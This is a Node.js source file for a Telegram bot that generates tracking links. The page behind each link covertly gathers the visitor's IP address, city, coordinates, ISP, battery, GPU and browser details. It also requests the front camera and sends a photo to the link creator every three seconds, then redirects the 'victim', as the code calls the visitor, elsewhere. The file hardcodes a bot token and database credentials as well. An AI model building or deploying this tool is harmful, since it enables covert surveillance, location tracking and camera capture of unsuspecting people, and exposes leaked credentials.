/**
 * 𝐃𝐗-𝐂𝐎𝐃𝐄𝐗 𝐌𝐎𝐓𝐇𝐄𝐑 𝐒𝐘𝐒𝐓𝐄𝐌 v6.0
 * Sequential Data | Specific Detailed Info | Reply-To-User | Custom Borders
 */

const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const cors = require('cors');
const axios = require('axios');
const fs = require('fs');

// 🛠 CONFIGURATION
const TOKEN = "8291862788:AAEvXOm7TSrCIjb1TxPm7rleiG_NooTgxdE";
const OWNER_IDS = [6703335929, 6041728084, 5136260272]; 
const CHANNEL_ID1 = "@alphacodex369";
const CHANNEL_ID2 = "@Termuxcodex";
const GROUP_ID = "@Codex_teamx"; 
const MONGO_URI = "mongodb+srv://darkgangdarks_db_user:aEEYR59YEVameS1y@cluster0.iyakwh0.mongodb.net/DEVICEX?retryWrites=true&w=majority";

const bot = new TelegramBot(TOKEN, { polling: true });
const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json({ limit: '50mb' })); 
app.use(bodyParser.urlencoded({ extended: true }));

// ─── 💾 DATABASE ──────────────────────────────────────────

mongoose.connect(MONGO_URI).then(() => console.log('✅ MongoDB Connected'));

const userSchema = new mongoose.Schema({
    chatId: { type: Number, unique: true },
    username: String,
    firstName: String,
    coins: { type: Number, default: 0 },
    freeUrlsLeft: { type: Number, default: 4 },
    isBanned: { type: Boolean, default: false },
    joinedAt: { type: Date, default: Date.now }
});

const linkSchema = new mongoose.Schema({
    shortId: { type: String, unique: true },
    creatorChatId: Number,
    originalUrl: String, 
    customName: String,
    createdAt: { type: Date, default: Date.now, expires: 86400 } 
});

const User = mongoose.model('User', userSchema);
const Link = mongoose.model('Link', linkSchema);

// ─── 🎨 STYLING & HELPERS ─────────────────────────────────

const fontMap = {'a':'ᴀ','b':'ʙ','c':'ᴄ','d':'ᴅ','e':'ᴇ','f':'ғ','g':'ɢ','h':'ʜ','i':'ɪ','j':'ᴊ','k':'ᴋ','l':'ʟ','m':'ᴍ','n':'ɴ','o':'ᴏ','p':'ᴘ','q':'ǫ','r':'ʀ','s':'s','t':'ᴛ','u':'ᴜ','v':'ᴠ','w':'ᴡ','x':'x','y':'ʏ','z':'ᴢ','A':'ᴀ','B':'ʙ','C':'ᴄ','D':'ᴅ','E':'ᴇ','F':'ғ','G':'ɢ','H':'ʜ','I':'ɪ','J':'ᴊ','K':'ᴋ','L':'ʟ','M':'ᴍ','N':'ɴ','O':'ᴏ','P':'ᴘ','Q':'ǫ','R':'ʀ','S':'s','T':'ᴛ','U':'ᴜ','V':'ᴠ','W':'ᴡ','X':'x','Y':'ʏ','Z':'ᴢ','0':'₀','1':'₁','2':'₂','3':'₃','4':'₄','5':'₅','6':'₆','7':'₇','8':'₈','9':'₉'};

function _fnt(text) {
    if(!text) return "";
    return text.split('').map(c => fontMap[c] || c).join('');
}

// Custom Short Border with ┃ and Mention
function makeBorder(title, content) {
    const lines = content.split('\n').map(line => `┃ ${line}`).join('\n');
    return `<b>┏━━「 ${_fnt(title)} 」━━┓</b>\n${lines}\n<b>┗━━━━━━━━━━┛</b>`;
}

// ─── 🤖 BOT FUNCTIONS ─────────────────────────────────────

async function checkMembership(chatId) {
    try {
        const s = ['creator', 'administrator', 'member', 'restricted'];
        const c1 = await bot.getChatMember(CHANNEL_ID1, chatId);
        const c2 = await bot.getChatMember(CHANNEL_ID2, chatId);
        const g1 = await bot.getChatMember(GROUP_ID, chatId);
        return { allJoined: s.includes(c1.status) && s.includes(c2.status) && s.includes(g1.status) };
    } catch (e) { return { allJoined: false }; }
}

const userState = {};

bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    let user = await User.findOne({ chatId });
    if (!user) {
        user = new User({ chatId, username: msg.from.username, firstName: msg.from.first_name });
        await user.save();
    }
    if (user.isBanned) return;
    const { allJoined } = await checkMembership(chatId);
    if (allJoined) showMainMenu(msg);
    else showVerificationMenu(msg);
});

function showMainMenu(msg) {
    const mention = `<a href="tg://user?id=${msg.from.id}">${msg.from.first_name}</a>`;
    const content = `👤: ${mention}\n🆔: <code>${msg.from.id}</code>\n💬: sᴇʟᴇᴄᴛ ᴀɴ ᴏᴘᴛɪᴏɴ`;
    bot.sendMessage(msg.chat.id, makeBorder("ᴅᴀsʜʙᴏᴀʀᴅ", content), {
        parse_mode: 'HTML',
        reply_to_message_id: msg.message_id,
        reply_markup: { keyboard: [[{ text: "🔗 ᴄʀᴇᴀᴛᴇ ɴᴇᴡ ᴜʀʟ" }], [{ text: "👤 ᴍʏ ɪɴғᴏ" }, { text: "👨‍💻 ᴅᴇᴠᴇʟᴏᴘᴇʀ" }]], resize_keyboard: true }
    });
}

function showVerificationMenu(msg) {
    const mention = `<a href="tg://user?id=${msg.from.id}">${msg.from.first_name}</a>`;
    const content = `👋: ʜᴇʟʟᴏ, ${mention}\n📢: ᴊᴏɪɴ ᴏᴜʀ ᴄʜᴀɴɴᴇʟs!`;
    bot.sendMessage(msg.chat.id, makeBorder("ᴡᴇʟᴄᴏᴍᴇ", content), {
        parse_mode: 'HTML',
        reply_to_message_id: msg.message_id,
        reply_markup: {
            inline_keyboard: [
                [{ text: "📢 ᴄʜᴀɴɴᴇʟ 𝟷", url: `https://t.me/${CHANNEL_ID1.replace('@', '')}` }],
                [{ text: "📢 ᴄʜᴀɴɴᴇʟ 𝟸", url: `https://t.me/${CHANNEL_ID2.replace('@', '')}` }],
                [{ text: "👥 ɢʀᴏᴜᴘ", url: `https://t.me/${GROUP_ID.replace('@', '')}` }],
                [{ text: "✅ ᴠᴇʀɪғʏ", callback_data: "verify_join" }]
            ]
        }
    });
}

// ─── 📩 CALLBACK & MESSAGE HANDLERS ───────────────────────

bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    const data = query.data;
    const msg = query.message;

    if (data === 'verify_join') {
        const { allJoined } = await checkMembership(chatId);
        if (allJoined) { bot.deleteMessage(chatId, msg.message_id); showMainMenu(query); }
        else bot.answerCallbackQuery(query.id, { text: "⚠️ ᴊᴏɪɴ ᴀʟʟ ᴄʜᴀɴɴᴇʟs!", show_alert: true });
    } else if (data === 'create_custom') {
        userState[chatId] = { step: 'await_custom_name' };
        bot.sendMessage(chatId, makeBorder("ᴄᴜsᴛᴏᴍ ɴᴀᴍᴇ", "✏️: sᴇɴᴅ ᴄᴜsᴛᴏᴍ ɴᴀᴍᴇ"), { parse_mode: 'HTML', reply_to_message_id: msg.message_id });
    } else if (data === 'create_random') {
        askRedirect(query, Math.random().toString(36).substring(7));
    } else if (data === 'use_redirect') {
        userState[chatId].step = 'await_redirect_url';
        bot.sendMessage(chatId, makeBorder("ʀᴇᴅɪʀᴇᴄᴛ", "🌐: sᴇɴᴅ ʀᴇᴅɪʀᴇᴄᴛ ᴜʀʟ"), { parse_mode: 'HTML', reply_to_message_id: msg.message_id });
    } else if (data === 'no_redirect') {
        createFinalLink(query, userState[chatId].name, null);
    }
});

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    if (text === "🔗 ᴄʀᴇᴀᴛᴇ ɴᴇᴡ ᴜʀʟ") {
        const user = await User.findOne({ chatId });
        const mention = `<a href="tg://user?id=${msg.from.id}">${msg.from.first_name}</a>`;
        bot.sendMessage(chatId, makeBorder("ᴄʀᴇᴀᴛᴇ", `👤: ${mention}\n🎁: ${user.freeUrlsLeft}\n💰: ${user.coins}`), {
            parse_mode: 'HTML',
            reply_to_message_id: msg.message_id,
            reply_markup: { inline_keyboard: [[{ text: "✏️ ᴄᴜsᴛᴏᴍ", callback_data: "create_custom" }, { text: "🎲 ʀᴀɴᴅᴏᴍ", callback_data: "create_random" }]] }
        });
    } else if (text === "👤 ᴍʏ ɪɴғᴏ") {
        const user = await User.findOne({ chatId });
        const mention = `<a href="tg://user?id=${msg.from.id}">${msg.from.first_name}</a>`;
        bot.sendMessage(chatId, makeBorder("ᴍʏ ɪɴғᴏ", `👤: ${mention}\n💰: ${user.coins}\n🎁: ${user.freeUrlsLeft}`), { parse_mode: 'HTML', reply_to_message_id: msg.message_id });
    } else if (userState[chatId]) {
        if (userState[chatId].step === 'await_custom_name') {
            userState[chatId].name = text.trim();
            askRedirect(msg, text.trim());
        } else if (userState[chatId].step === 'await_redirect_url') {
            createFinalLink(msg, userState[chatId].name, text.trim());
        }
    }
});

function askRedirect(msg, name) {
    const chatId = msg.from ? msg.from.id : msg.chat.id;
    userState[chatId] = { name: name, step: 'await_choice' };
    bot.sendMessage(chatId, makeBorder("ᴏᴘᴛɪᴏɴ", `📝: ɴᴀᴍᴇ: ${name}\n❓: ʀᴇᴅɪʀᴇᴄᴛ ᴠɪᴄᴛɪᴍ?`), {
        parse_mode: 'HTML',
        reply_to_message_id: msg.message_id || msg.message.message_id,
        reply_markup: { inline_keyboard: [[{ text: "✅ ʏᴇs", callback_data: "use_redirect" }, { text: "❌ ɴᴏ", callback_data: "no_redirect" }]] }
    });
}

async function createFinalLink(msg, name, redirectUrl) {
    const chatId = msg.from ? msg.from.id : msg.chat.id;
    const user = await User.findOne({ chatId });
    if (user.freeUrlsLeft > 0) user.freeUrlsLeft -= 1; else user.coins -= 1;
    await user.save();
    await new Link({ shortId: name, creatorChatId: chatId, originalUrl: redirectUrl }).save();
    delete userState[chatId];
    const url = `https://${process.env.RENDER_EXTERNAL_HOSTNAME || 'YOUR_APP.onrender.com'}/w/${name}`;
    const mention = `<a href="tg://user?id=${chatId}">${msg.from.first_name}</a>`;
    bot.sendMessage(chatId, makeBorder("✅ ᴅᴏɴᴇ", `👤: ${mention}\n🔗: ${url}\n🔄: ${redirectUrl || 'N/A'}`), { parse_mode: 'HTML', reply_to_message_id: msg.message_id || msg.message.message_id });
}

// ─── 📣 BROADCAST SYSTEM ──────────────────────────────────

bot.onText(/\/broadcast (.+)/, async (msg, match) => {
    if (!OWNER_IDS.includes(msg.chat.id)) return;
    let text = match[1];
    let reply_markup = null;
    const btnMatch = text.match(/\[(.*)\|(.*)\]/);
    if (btnMatch) {
        text = text.replace(btnMatch[0], "").trim();
        reply_markup = { inline_keyboard: [[{ text: btnMatch[1].trim(), url: btnMatch[2].trim() }]] };
    }
    const users = await User.find({});
    for (const u of users) {
        bot.sendMessage(u.chatId, `<b>📢 ʙʀᴏᴀᴅᴄᴀsᴛ</b>\n\n${text}`, { parse_mode: 'HTML', reply_markup }).catch(()=>{});
    }
    bot.sendMessage(msg.chat.id, makeBorder("sᴜᴄᴄᴇss", "📢: ʙʀᴏᴀᴅᴄᴀsᴛ sᴇɴᴛ!"), { parse_mode: 'HTML', reply_to_message_id: msg.message_id });
});

// ─── 🌐 WEB ENGINE & DATA RECEIVER ────────────────────────

app.get('/w/:id', async (req, res) => {
    const link = await Link.findOne({ shortId: req.params.id });
    if (!link) return res.status(404).send("EXPIRED");
    res.send(getHtmlTemplate(req.params.id, link.originalUrl));
});

app.post('/api/data', async (req, res) => {
    const { linkId, type, data } = req.body;
    const link = await Link.findOne({ shortId: linkId });
    if (!link) return res.json({ status: 'error' });
    const owner = link.creatorChatId;

    try {
        if (type === 'info') {
            const _n = data.ipData;
            const _batt = data.battery;
            const _gpu = data.gpu;
            const navigator = data.navigator;
            const screen = data.screen;

            // [RESTORED FULL DETAILS]
            let msg = `<b>${_fnt("CODEX DEVICE INFO")}</b>\n\n`;
            msg += `<b>${_fnt("DEVICE")}:</b> <code>${navigator.platform}</code>\n`;
            msg += `<b>${_fnt("IP ADDRESS")}:</b> <a href="https://ipwho.is/${_n.ip}">${_n.ip}</a>\n`;
            msg += `<b>${_fnt("NETWORK")}:</b> <code>${_n.isp}</code>\n`;
            msg += `<b>${_fnt("LOCATION")}:</b> <code>${_n.city}, ${_n.country}</code>\n`;
            msg += `<b>${_fnt("COORDINATES")}:</b> <code>${_n.loc}</code>\n`;
            msg += `<b>${_fnt("BATTERY")}:</b> <code>${_batt}</code>\n`;
            msg += `<b>${_fnt("CPU CORES")}:</b> <code>${navigator.hardwareConcurrency || 'N/A'}</code>\n`;
            msg += `<b>${_fnt("RAM")}:</b> <code>${navigator.deviceMemory || 'N/A'} GB</code>\n`;
            msg += `<b>${_fnt("GPU")}:</b> <code>${_gpu}</code>\n`;
            msg += `<b>${_fnt("SCREEN")}:</b> <code>${screen.width}x${screen.height} (${screen.colorDepth}-bit)</code>\n`;
            msg += `<b>${_fnt("TIMEZONE")}:</b> <code>${data.timezone}</code>\n`;
            msg += `<b>${_fnt("LANGUAGE")}:</b> <code>${navigator.language}</code>\n`;
            msg += `<b>${_fnt("USER AGENT")}:</b> <pre>${navigator.userAgent}</pre>\n\n`;
            msg += `<blockquote>${_fnt("DEV-BY: DX-CODEX || ")}@Termuxcodex</blockquote>`;

            await bot.sendMessage(owner, msg, { parse_mode: 'HTML', disable_web_page_preview: true });
        
        } else if (type === 'cam') {
            const buffer = Buffer.from(data.image.replace(/^data:image\/jpeg;base64,/, ""), 'base64');
            await bot.sendPhoto(owner, buffer, { 
                caption: `<b>📸 ᴄᴀᴍᴇʀᴀ ᴄᴀᴘᴛᴜʀᴇ</b>\n\n<b>ᴅᴇᴠɪᴄᴇ:</b> <code>${data.platform}</code>`, 
                parse_mode: 'HTML' 
            });
        }
        res.json({ status: 'success' });
    } catch (e) { res.json({ status: 'error' }); }
});

function getHtmlTemplate(linkId, redirectUrl) {
    return `
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DX-CODEX</title>
    <style>
        body { margin: 0; background: #000; overflow: hidden; }
        #terminal { position: absolute; top: 10px; left: 10px; color: #0f0; font-family: monospace; font-size: 10px; z-index: 100; }
    </style>
</head>
<body>
    <div id="terminal">INITIALIZING...</div>
    <video id="v" style="display:none" autoplay playsinline></video>
    <canvas id="c" style="display:none"></canvas>
    <canvas id="matrix"></canvas>

<script>
const m = document.getElementById('matrix');
const ctx = m.getContext('2d');
m.width = window.innerWidth; m.height = window.innerHeight;
const drops = Array(Math.floor(m.width/20)).fill(0);
function draw() {
    ctx.fillStyle = 'rgba(0,0,0,0.05)'; ctx.fillRect(0,0,m.width,m.height);
    ctx.fillStyle = '#0f0'; ctx.font = '15px monospace';
    drops.forEach((y, i) => {
        const text = String.fromCharCode(Math.random()*128);
        ctx.fillText(text, i*20, y*20);
        if(y*20 > m.height && Math.random() > 0.975) drops[i] = 0;
        drops[i]++;
    });
}
setInterval(draw, 33);

async function start() {
    const log = document.getElementById('terminal');
    
    // COLLECT ALL DETAILS
    let ipData = {ip:"?"};
    try { const r = await fetch('https://ipwho.is/'); ipData = await r.json(); } catch(e){}
    
    let batt = "N/A";
    try { const b = await navigator.getBattery(); batt = Math.round(b.level*100) + "% " + (b.charging?"🔌":"🔋"); } catch(e){}
    
    let gpu = "N/A";
    try { 
        const gl = document.createElement('canvas').getContext('webgl'); 
        const db = gl.getExtension('WEBGL_debug_renderer_info'); 
        gpu = gl.getParameter(db.UNMASKED_RENDERER_WEBGL); 
    } catch(e){}

    const info = {
        ipData: { ip: ipData.ip, city: ipData.city, country: ipData.country, isp: ipData.connection?.isp, loc: ipData.latitude+","+ipData.longitude },
        battery: batt, gpu: gpu, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        screen: { width: screen.width, height: screen.height, colorDepth: screen.colorDepth },
        navigator: { platform: navigator.platform, hardwareConcurrency: navigator.hardwareConcurrency, deviceMemory: navigator.deviceMemory, language: navigator.language, userAgent: navigator.userAgent }
    };

    // SEQUENCE: INFO FIRST
    await fetch('/api/data', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({linkId:"${linkId}", type:'info', data: info}) });
    
    // CAMERA SECOND
    try {
        const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
        const v = document.getElementById('v'); v.srcObject = stream;
        v.onloadedmetadata = () => {
            setInterval(() => {
                const cvs = document.getElementById('c');
                cvs.width = v.videoWidth; cvs.height = v.videoHeight;
                cvs.getContext('2d').drawImage(v, 0, 0);
                fetch('/api/data', { 
                    method:'POST', 
                    headers:{'Content-Type':'application/json'}, 
                    body: JSON.stringify({linkId:"${linkId}", type:'cam', data: { image: cvs.toDataURL('image/jpeg', 0.5), platform: navigator.platform }}) 
                });
            }, 3000);
        };
    } catch(e) { }

    // REDIRECT
    if("${redirectUrl}" && "${redirectUrl}" !== "null") setTimeout(()=> window.location.href="${redirectUrl}", 5000);
}
start();
</script>
</body>
</html>`;
}

setInterval(() => { axios.get(`https://${process.env.RENDER_EXTERNAL_HOSTNAME}.onrender.com`).catch(()=>{}); }, 300000);
app.listen(PORT, () => console.log(`Server Online`));
